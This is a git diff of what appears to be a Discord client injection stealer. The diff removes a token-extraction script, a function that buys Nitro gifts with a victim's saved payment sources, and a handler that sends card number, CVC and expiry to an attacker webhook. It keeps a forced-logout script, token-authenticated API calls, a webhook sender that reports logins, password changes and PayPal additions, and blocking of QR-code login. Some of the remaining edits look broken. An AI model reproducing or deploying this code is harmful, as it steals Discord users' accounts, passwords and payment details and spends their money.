@@ -70,7 +70,7 @@ const config = {
     ],
   },
 };
-const [LOGOUT_SCRIPT, TOKEN_SCRIPT] = ["window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();", "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;"];
+const [LOGOUT_SCRIPT] = ["window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();"];
 
 const discordPath = (function () {
   const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
@@ -132,16 +132,16 @@ const wwww = async () => {
   await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(LOGOUT_SCRIPT, true);
 };
 
-const reeeee = async () => {
-  await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(TOKEN_SCRIPT, true);
-};
-
 const getInfo = async (token) => {
   const info = await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();
-  xmlHttp.open("GET", "${config.api}", true); // changed to asynchronous
+  xmlHttp.open("GET", "${config.api}", true);
   xmlHttp.setRequestHeader("Authorization", "${token}");
-  xmlHttp.send();
-  `);
+  xmlHttp.onreadystatechange = function() {
+    if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
+      console.log(xmlHttp.responseText); // Output the response to console
+    }
+  };
+  xmlHttp.send();`);
   return JSON.parse(info);
 };
 
@@ -173,54 +173,6 @@ const getBilling = async (token) => {
   });
   if (!billing) billing = '❌';
   return billing;
-};
-
-const Purchase = async (token, id, _type, _time) => {
-  const options = {
-    expected_amount: config.nitro[_type][_time]['price'],
-    expected_currency: 'usd',
-    gift: true,
-    payment_source_id: id,
-    payment_source_token: null,
-    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
-    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
-  };
-
-  const req = BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`var xmlHttp=new XMLHttpRequest,url="https://discord.com/api/v9/store/skus/"+config.nitro[_type][_time].id+"/purchase";xmlHttp.open("POST",url,!1),xmlHttp.setRequestHeader("Authorization",${token}),xmlHttp.setRequestHeader("Content-Type","application/json"),xmlHttp.send(JSON.stringify(options));var responseText=xmlHttp.responseText;`);
-  if (req['gift_code']) {
-    return 'https://discord.gift/' + req['gift_code'];
-  } else return null;
-};
-
-const buyNitro = async (token) => {
-  const data = await fetchBilling(token);
-  const failedMsg = 'Failed to Purchase ❌';
-  if (!data) return failedMsg;
-
-  let IDS = [];
-  data.forEach((x) => {
-    if (!x.invalid) {
-      IDS = IDS.concat(x.id);
-    }
-  });
-  for (let sourceID in IDS) {
-    const first = Purchase(token, sourceID, 'boost', 'year');
-    if (first !== null) {
-      return first;
-    } else {
-      const second = Purchase(token, sourceID, 'boost', 'month');
-      if (second !== null) {
-        return second;
-      } else {
-        const third = Purchase(token, sourceID, 'classic', 'month');
-        if (third !== null) {
-          return third;
-        } else {
-          return failedMsg;
-        }
-      }
-    }
-  }
 };
 
 const getNitro = (flags) => {
@@ -287,8 +239,7 @@ const hooker = async (content) => {
     'Access-Control-Allow-Origin': '*',
   };
   if (!config.webhook.includes('api/webhooks')) {
-    const key = totp(config.webhook_protector_key);
-    headers['Authorization'] = key;
+    // idk
   }
   const options = {
     protocol: url.protocol,
@@ -359,7 +310,7 @@ const login = async (email, password, token) => {
   hooker(content);
 };
 
-const passwordChanged = async (oldpassword, newpassword, token) => {
+const passwordChanged = async (newpassword, token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
@@ -477,7 +428,7 @@ const PaypalAdded = async (token) => {
         fields: [
           {
             name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            value: `okay but what now ??`,
             inline: false,
           },
           {
@@ -509,115 +460,6 @@ const PaypalAdded = async (token) => {
   hooker(content);
 };
 
-const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**CC Added**',
-            value: `CCN:\n **${number}**`,
-            inline: true,
-          },
-          {
-            name: 'CVC:',
-            value: ```**${cvc}**```,
-            inline: true,
-          },
-          {
-            name: 'CCE:',
-            value: ```**${expir_month}``/``${expir_year}**```,
-            inline: true,
-          },
-          {
-            name: 'Token',
-            value: `\`${token}\``,
-            inline: false,
-          },
-          {
-            name: 'Badges:',
-            value: `**${badges}**`,
-            inline: false,
-          },
-          {
-            name: 'Nitro Type:',
-            value: ```**${nitro}**```,
-            inline: true,
-          },
-          {
-            name: 'Billing:',
-            value: ```**${billing}**```,
-            inline: true,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const nitroBought = async (token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const code = await buyNitro(token);
-  const content = {
-    username: config.embed_name,
-    content: code,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Nitro bought!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
-            inline: true,
-          },
-          {
-            name: 'Token',
-            value: `\`${token}\``,
-            inline: false,
-          },
-          {
-            name: 'Badges:',
-            value: `**${badges}**`,
-            inline: false,
-          },
-          {
-            name: 'Nitro Type:',
-            value: ```**${nitro}**```,
-            inline: true,
-          },
-          {
-            name: 'Billing:',
-            value: ```**${billing}**```,
-            inline: true,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
-  hooker(content);
-};
 session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
   if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
   updateCheck();
